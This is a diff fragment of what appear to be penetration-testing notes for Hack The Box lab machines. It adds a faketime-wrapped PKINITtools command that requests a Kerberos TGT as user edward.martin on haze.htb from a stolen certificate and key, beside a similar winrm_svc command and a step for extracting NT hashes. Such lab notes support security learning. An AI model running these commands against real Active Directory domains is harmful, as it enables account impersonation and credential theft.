@@ -12,6 +12,10 @@ Request a TGT using pem files:
 python ~/workspace/tools/PKINITtools/gettgtpkinit.py -cert-pem kBxhoPQf_cert.pem -key-pem kBxhoPQf_priv.pem fluffy.htb/winrm_svc winrm_svc.ccache
 ```
 
+```shell
+faketime "$(ntpdate -q haze.htb | awk '{print $1" "$2}')" python ~/workspace/tools/PKINITtools/gettgtpkinit.py -cert-pem TC6qIhU0_cert.pem -key-pem TC6qIhU0_priv.pem haze.htb/edward.martin edward_martin.ccache
+```
+
 Get NT Hash with AS-REP encryption key and TGT
 
 ```shell
